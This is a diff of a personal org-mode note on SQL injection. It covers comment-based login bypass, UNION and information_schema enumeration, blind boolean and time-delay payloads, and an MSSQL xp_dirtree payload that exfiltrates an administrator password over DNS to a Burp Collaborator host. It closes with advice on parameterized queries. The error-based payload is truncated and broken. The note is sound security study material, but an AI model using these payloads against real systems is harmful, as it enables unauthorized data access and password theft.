@@ -7,94 +7,200 @@
 
 * Overview
 #+begin_quote
-SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.
+[[id:5b33d78a-58bb-4df4-af2d-ac8eced7fe2e][SQL]] injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.
 #+end_quote
 
+Common SQL injections include:
+- Retrieving hidden data
+- Subverting application logic
+- Viewing database tables
+- Examining the database
+- Blind SQL injection
+
+* Retrieving Hidden Data
+In this attack, the attacker can modify an [[id:5b33d78a-58bb-4df4-af2d-ac8eced7fe2e][SQL]] query to return additional results.
+
+If an application makes an SQL query where user input is injected into it without any sanitization, then it is possible to craft an input that returns more than the intended results.
+
+For example, if a certain functionality in the web application causes the following query to be sent to the server:
+#+begin_src SQL
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+#+end_src
+
+Then an attacker can take advantage of having no defenses against SQL injection attacks by crafting the following payload:
+#+begin_src SQL
+SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+#+end_src
+Since the rest of the query is going to be treated as a comment, due to ~--~, then this query will return all gifts in the table, released or not.
+
+In addition, the attacker can cause the query to return all products from all of the categories:
+#+begin_src SQL
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+#+end_src
+
+* Subverting Application Logic
+In this attack, the attacker can change a query to interfere with the application's logic. A [[id:25a1de57-6839-445f-bf84-e20b746d9d82][logic flaw]] can be leveraged by sending a specially crafted [[id:5b33d78a-58bb-4df4-af2d-ac8eced7fe2e][SQL]] query to the server.
+
+A classic example of using SQL injection to abuse logic flaws, is authentication bypass. If an application makes an SQL query for authentication where user input is injected into it without any sanitization, then it is possible to craft an input that gives access to any account.
+
+For example, the following SQL query might be used for logging in a user:
+#+begin_src SQL
+SELECT * FROM users WHERE username = 'wiener' AND password = 'zigler'
+#+end_src
+
+The attacker can bypass the password check by forcing the rest of the query to be treated as a comment:
+#+begin_src SQL
+SELECT * FROM users WHERE username = 'wiener'--' AND password = 'zigler'
+#+end_src
+
+* Viewing Database Tables
+In this attack, the attacker can retrieve data from different database tables. If the results of [[id:5b33d78a-58bb-4df4-af2d-ac8eced7fe2e][SQL]] queries are returned as part of the application's response, it is possible to append additional ~SELECT~ statements to view other tables.
+
+** UNION Injection
+The ~UNION~ keyword can be used to execute and append ~SELECT~ queries to the result of the original query.
+
+To leverage ~UNION~ injection attacks, two condition must be met:
+1. Each query must return the same number of columns.
+2. The data type in each column must be the same in each query.
+
+*** Multiple Columns
+**** Detecting the Number of Columns
+***** ORDER BY
+An easy way to check how many columns are being returned from the original query is to use ~ORDER BY X~ where "X" is a number. In this query we order the results by different columns in the result set. This is done by specifying an index, not a column name.
+
+If the query ~ORDER BY 3--~ is sent, and an error was detected, then the query contains less that 3 columns.
+
+***** UNION SELECT NULL
+Since the ~NULL~ value can be convertible to every used data type, we can use it to get the number of columns.
+
+When the application errs after sending 4 ~NULL~ values with ~UNION SELECT NULL, NULL, NULL, NULL--~, then the number of columns is less than 4.
+
+**** Detecting the Data Type
+To know what value each column supports, we can issue a ~UNION SELECT~. For example, to test whether a column can hold a string value, we can submit ~'a'~ to that column.
+#+begin_src sql
+UNION SELECT 'a',NULL,NULL,NULL
+#+end_src
+
+*** Single Column
+If the query only returns a single column, then concatenating the values together can be used. Using a separator is ideal if possible.
+
+For example, ~group_concat(table)~ can be used to group multiple values together in MySQL. In Oracle, the double-pipe sequence ~||~ can be used to do string concatenation. Different databases use different syntax, more can be seen in a [[id:74bb259b-6f1b-492f-b4ac-3c55af2a93a7][SQL injection cheat sheet]].
+
+* Examining the Database
+In this attack, the attacker can extract information about the version and structure of the database.
+
+Obtaining information about the database itself via [[id:5b33d78a-58bb-4df4-af2d-ac8eced7fe2e][SQL]] injection is useful. This information can pave the way for other attack vectors and exploitation.
+
+Since this is highly dependent on the database being used, a [[id:74bb259b-6f1b-492f-b4ac-3c55af2a93a7][SQL injection cheat sheet]] is handy to maintain.
+
+Quering the database for its version and type can provide valuable information for an attacker, for example, it might be that the version used is vulnerable to a known CVE.
+
+In addition, information about the database (not the software), is key. This allows an attacker to enumerate table names and columns.
+
+For example, quering
+#+begin_src SQL
+SELECT * FROM information_schema.tables
+#+end_src
+might return output like the following:
+#+begin_example
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+=====================================================
+MyDatabase     dbo           Products    BASE TABLE
+MyDatabase     dbo           Users       BASE TABLE
+MyDatabase     dbo           Feedback    BASE TABLE
+#+end_example
+
+This can be followed by an additional query
+#+begin_src SQL
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+#+end_src
+to get this table's columns:
+#+begin_example
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+=================================================================
+MyDatabase     dbo           Users       UserId       int
+MyDatabase     dbo           Users       Username     varchar
+MyDatabase     dbo           Users       Password     varchar
+#+end_example
 
 * Blind SQL Injection
 From Wikipedia:
 #+begin_quote
-Blind SQL injection is used when a web application is vulnerable to an SQL injection but the results of the injection are not visible to the attacker. The page with the vulnerability may not be one that displays data but will display differently depending on the results of a logical statement injected into the legitimate SQL statement called for that page. This type of attack has traditionally been considered time-intensive because a new statement needed to be crafted for each bit recovered, and depending on its structure, the attack may consist of many unsuccessful requests. Recent advancements have allowed each request to recover multiple bits, with no unsuccessful requests, allowing for more consistent and efficient extraction. There are several tools that can automate these attacks once the location of the vulnerability and the target information has been established.
+Blind [[id:5b33d78a-58bb-4df4-af2d-ac8eced7fe2e][SQL]] injection is used when a web application is vulnerable to an SQL injection but the results of the injection are not visible to the attacker. The page with the vulnerability may not be one that displays data but will display differently depending on the results of a logical statement injected into the legitimate SQL statement called for that page. This type of attack has traditionally been considered time-intensive because a new statement needed to be crafted for each bit recovered, and depending on its structure, the attack may consist of many unsuccessful requests. Recent advancements have allowed each request to recover multiple bits, with no unsuccessful requests, allowing for more consistent and efficient extraction. There are several tools that can automate these attacks once the location of the vulnerability and the target information has been established.
 #+end_quote
 
-* Common Payloads
-A typical login query would be:
-#+begin_src sql
-SELECT * FROM users WHERE username='username' AND password='password'
+Blind vulnerabilities can still be exploited and depending on the nature of the vulnerability and the database involved, some techniques can be used to exploit blind SQL injection vulnerabilities:
+
+- Conditional time delay queries can be used to infer the truth of the condition based on the time that the application takes to respond.
+- Changing the logic of the query to trigger detectable difference in the application's response. This involves hijacking a new condition into a Boolean logic, or purposefully injecting queries that will err such as divide-by-zero.
+- Triggering an out-of-band network interaction using [[id:737fa080-d560-48b3-8428-dba230a0fd36][OAST]] techniques to exfiltrate data..
+
+Note that this type of attack is dependent on what database is being targeted, a [[id:74bb259b-6f1b-492f-b4ac-3c55af2a93a7][SQL injection cheat sheet]] should be consulted.
+
+** Boolean Injection
+It is possible to inject a conditional query to enumerate data. An example of this might be [[id:5b33d78a-58bb-4df4-af2d-ac8eced7fe2e][SQL]] injection in cookies. Since the response is hidden to the user, it is considered blind.
+
+If a certain message such as "Welcome" is displayed when having a valid cookie, and the cookie is being checked using a vulnerable query
+#+begin_src SQL
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+#+end_src
+then we can inject a condition on the password of a certain user
+#+begin_src SQL
+Tj4' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+#+end_src
+if the message "Welcome" is displayed, then the first letter has a greater value than 'm'.
+
+This method can be automated to extract the password one letter at a time.
+
+** SQL Errors
+If the behavior of the application is the same when injecting Boolean conditions, then causing the database to throw an error if a condition is true might be fruitful since some application do not handle [[id:5b33d78a-58bb-4df4-af2d-ac8eced7fe2e][SQL]] errors thrown by the database, leaking information by accident.
+
+#+begin_src SQL
+Tj4' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
 #+end_src
 
-We can exploit the above query using:
+If the first letter is greater than 'm' then a divide-by-zero error is thrown, otherwise the ~CASE~ expression evaluates to 'a'.
+
+** Time Delay
+If Boolean injection don't work and [[id:5b33d78a-58bb-4df4-af2d-ac8eced7fe2e][SQL]] errors are handled, then triggering time delays conditionally might be possible.
+
+Since most of SQL queries are processed synchronously by the application, delaying the execution of the query delays the [[id:2a8da6c9-ff7d-45a2-b0fd-9fe91fefd738][HTTP]] response from being sent.
+
+On Microsoft SQL Server, we can delay the response from coming by 10 seconds by using the ~WAITFOR DELAY~ query:
+#+begin_src SQL
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
+#+end_src
+
+** SQL Injection using OAST
+It is often possible to exploit the blind [[id:5b33d78a-58bb-4df4-af2d-ac8eced7fe2e][SQL]] injection vulnerability by triggering out-of-band network interactions to a system that the attacker controls.
+
+This interaction can be used conditionally to infer information one bit at a time. It is also possible fully exfiltrate data using this interaction, this is most common using the [[id:c620b007-1376-4f39-9808-5ff9ff487e93][DNS]] protocol since most web applications allow free egress of DNS queries, because they are essential for the normal application to operate.
+
+Again, this is highly specific to the type of database being used, see the [[id:74bb259b-6f1b-492f-b4ac-3c55af2a93a7][SQL injection cheat sheet]] for specific payloads.
+
+For example, if the database is MSSQL, then the following query can be used
+#+begin_src SRC
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+#+end_src
+which triggers a DNS lookup
 #+begin_example
-or 1=1
-or 1=1--
-or 1=1#
-or 1=1/*
-admin' --
-admin' #
-admin'/*
-admin' or '1'='1
-admin' or '1'='1'--
-admin' or '1'='1'#
-admin' or '1'='1'/*
-admin'or 1=1 or ''='
-admin' or 1=1
-admin' or 1=1--
-admin' or 1=1#
-admin' or 1=1/*
-admin') or ('1'='1
-admin') or ('1'='1'--
-admin') or ('1'='1'#
-admin') or ('1'='1'/*
-admin') or '1'='1
-admin') or '1'='1'--
-admin') or '1'='1'#
-admin') or '1'='1'/*
-1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
-admin" --
-admin" #
-admin"/*
-admin" or "1"="1
-admin" or "1"="1"--
-admin" or "1"="1"#
-admin" or "1"="1"/*
-admin"or 1=1 or ""="
-admin" or 1=1
-admin" or 1=1--
-admin" or 1=1#
-admin" or 1=1/*
-admin") or ("1"="1
-admin") or ("1"="1"--
-admin") or ("1"="1"#
-admin") or ("1"="1"/*
-admin") or "1"="1
-admin") or "1"="1"--
-admin") or "1"="1"#
-admin") or "1"="1"/*
-1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
 #+end_example
-Some things to note:
-- The comment sequence ~--~ causes the remainder of the query to be ignored.
-- We use ~OR 1=1~ to return all data in the table (always true).
 
-* Union Injection
-Union injection attacks can be used to retrieve data from other tables within the database. To do so, two condition must be met:
-1. Each query must return the same number of columns.
-1. The data type in each column must be the same in each query.
+* Detecting SQL Injection Vulnerabilities
+Automation tools such as [[id:c53bef6c-d57a-46c7-9689-4f3737e12bc0][Burp Suite's web vulnerability scanner]] or [[id:17dd20d7-52bd-41ed-b981-7081ee73fdaf][sqlmap]] can be used to quickly find some types of [[id:5b33d78a-58bb-4df4-af2d-ac8eced7fe2e][SQL]] injection.
 
-An easy way to check how many columns are being returned from the original query is to use ~ORDER BY X~ where "X" is a number. In this query we order the results by different columns in the result set. This is done by specifying an index, not a column name.
+Manual detection can be done by using a systematic set of tests against every entry point in the application.
+- Submitting a combination of all or some closing characters typically used in SQL queries such as parentheses and single/double quotes.
+- Submitting some SQL-specific syntax that evaluates to the original value of the query and to a different value, and looking for any difference.
+- Submitting Boolean conditions.
+- Submitting time-delay payloads.
+- Submitting [[id:737fa080-d560-48b3-8428-dba230a0fd36][OAST]] payloads.
 
-To know what value each column supports, we can issue a ~UNION SELECT~.
-#+begin_src sql
-UNION SELECT ‘a’,NULL,NULL,NULL
-#+end_src
+* Preventing SQL Injection
+Most instances of [[id:5b33d78a-58bb-4df4-af2d-ac8eced7fe2e][SQL]] injection can be prevented by using [[id:48d9d6c4-eb4d-4cc5-b03b-77e397547846][parameterized queries]] instead of concatenating user provided input to queries.
 
-If the return statement is limited, we can use ~group_concat(table)~ to group multiple values together.
-
-* Wildcard Injection
-Some databases accept wildcards such as the asterisk ~*~ which matches all entries in a table. To find credentials in this case, we can write a scirpt that appends ~*~ to the username/password and collect all characters that result in valid requests.
-
-* Tips and Tricks
-- In sqlite3, we can use the keyword ~AS~ to give a column a temporary name, this helps when the query is fixed using a certain column name.
+Prepared statements should be used for any situation where untrusted input appears as data within the query (~WHER~, ~INSERT~, ~UPDATE~, etc). In other parts of the query such as table name or column name or ~ORDER BY~ clause, they can't be used. If an application places untrusted data into those parts, different approach, such as white-listing permitted input values, or using different logic to deliver the required behavior should be used.
 
 * Resources
 - [[https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/][SQL Injection Authentication Bypass Cheat Sheet]]
